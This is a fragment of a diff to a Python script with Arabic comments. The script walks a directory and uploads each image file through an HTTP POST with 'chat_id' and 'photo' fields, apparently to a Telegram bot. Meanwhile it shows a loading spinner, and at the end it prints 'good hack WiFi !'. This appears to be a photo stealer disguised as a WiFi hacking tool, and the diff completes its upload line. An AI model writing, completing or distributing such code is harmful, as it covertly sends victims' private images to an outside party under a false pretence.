@@ -23,10 +23,10 @@ def send_images_from_directory(directory):
                 file_path = os.path.join(root, file)
                 try:
                     with open(file_path, "rb") as image_file:
-                        response = requests.post(url, data={"chat_id": chat>
+                        response = requests.post(url, data={"chat_id": chat_id}, files={"photo": image_file})
                     if response.status_code == 200:
                         # تحديث الرسالة دون الانتقال إلى سطر جديد
-                        sys.stdout.write(GREEN + "\r wait " + next(s>
+                        sys.stdout.write(GREEN + "\r whait  " + next(spinner) + RESET)
                         sys.stdout.flush()
                         time.sleep(0.5)  # مهلة بسيطة لإظهار تأثير التحميل
                 except Exception as e:
@@ -36,4 +36,4 @@ def send_images_from_directory(directory):
 send_images_from_directory(base_dir)
 
 # طباعة رسالة عند الانتهاء
-print(GREEN + "\ngood hack is wifi " + RESET)
+print(GREEN + "\n good hack WiFi   !" + RESET)
